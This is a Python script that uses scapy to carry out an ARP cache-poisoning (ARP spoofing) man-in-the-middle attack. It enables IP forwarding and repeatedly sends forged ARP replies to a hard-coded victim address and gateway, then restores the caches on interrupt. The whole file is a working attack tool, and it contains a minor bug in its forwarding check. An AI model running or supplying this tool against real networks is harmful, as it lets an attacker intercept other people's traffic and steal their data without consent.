from scapy.all import Ether, ARP, srp, send
import argparse, time, os, sys

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)
        
def _enable_windows_iproute():
    """
    Enables IP route (IP Forwarding) in Windows
    """
    from services import WService
    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()
    
def enable_ip_route(verbose=True):
    """
    Enables IP forwarding
    """
    if verbose:
        print("[!] Enabling IP Routing...")
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")
        
def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
        
def spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    target_mac = get_mac(target_ip) # get the mac address of the target
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at') # craft the arp 'is-at' operation packet, hwsrc = sender mac
    send(arp_response, verbose=0) # send packet
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
        
def restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    target_mac = get_mac(target_ip) # get the real MAC address of target
    host_mac = get_mac(host_ip) # get the real MAC address of spoofed (gateway, i.e router)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac) # crafting the restoring packet
    send(arp_response, verbose=0, count=7) # sends restored packet (7 times)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
        
if __name__ == "__main__":
    target = "192.168.1.100" # victim ip address
    host = "192.168.1.1"     # gateway ip address
    
    verbose = True # print progress to the screen   
    enable_ip_route() # enable ip forwarding
    try:
        while True:
            spoof(target, host, verbose) # telling the `target` that we are the `host`
            spoof(host, target, verbose) # telling the `host` that we are the `target`
            time.sleep(1)# sleep for one second
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target, host)
        restore(host, target)